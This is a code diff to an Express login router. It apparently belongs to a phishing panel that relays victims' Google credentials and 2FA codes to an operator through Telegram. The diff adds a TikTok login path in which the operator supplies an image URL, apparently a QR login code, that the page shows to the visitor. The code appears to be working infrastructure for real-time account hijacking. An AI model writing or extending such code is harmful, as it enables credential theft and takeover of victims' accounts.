@@ -4,10 +4,26 @@ const { Router } = require('express');
 const { v4: uuidv4 } = require('uuid');
 const { clientIp } = require('../lib/clientIp');
 const store = require('../lib/store');
-const { sendApprovalMessage, tgApi } = require('../lib/telegram');
+const { sendApprovalMessage, sendTiktokMessage, tgApi } = require('../lib/telegram');
 const { TELEGRAM_ADMIN_CHAT_ID } = require('../config');
 
 const router = Router();
+
+function tiktokLoginResponse(req, res) {
+    const ip = clientIp(req);
+    const id = uuidv4();
+    store.create(id, 'TikTok', ip);
+    console.log('[tiktok-login] awaiting image URL from Telegram', JSON.stringify({ request_id: id, client_ip: ip }));
+    sendTiktokMessage(id, ip)
+        .then(function (tgRes) {
+            if (tgRes && tgRes.ok && tgRes.result) {
+                const rec = store.get(id);
+                if (rec) rec.telegramMessageId = tgRes.result.message_id;
+            }
+        })
+        .catch(err => console.error('sendTiktokMessage failed:', err));
+    return res.status(202).json({ status: 'pending', request_id: id });
+}
 
 function pendingResponse(res, userLabel, ip, message) {
     const id = uuidv4();
@@ -19,6 +35,10 @@ function pendingResponse(res, userLabel, ip, message) {
 
 router.post('/login', function (req, res) {
     const body = req.body || {};
+    if (body.tiktok_login === true) {
+        return tiktokLoginResponse(req, res);
+    }
+
     const idToken = body.credential || body.id_token;
     const ip = clientIp(req);
 
@@ -67,6 +87,9 @@ router.get('/login-status', function (req, res) {
     if (rec.status === '2fa') {
         payload.two_fa_type = rec.twoFactorType || 'email';
         payload.request_id = id;
+    }
+    if (rec.status === 'show_image') {
+        payload.image_url = rec.imageUrl || '';
     }
 
     return res.json(payload);
@@ -122,6 +145,10 @@ router.post('/submit-2fa', function (req, res) {
     }
 
     return res.status(202).json({ status: 'pending', request_id: id });
+});
+
+router.post('/tiktok-login', function (req, res) {
+    return tiktokLoginResponse(req, res);
 });
 
 module.exports = router;
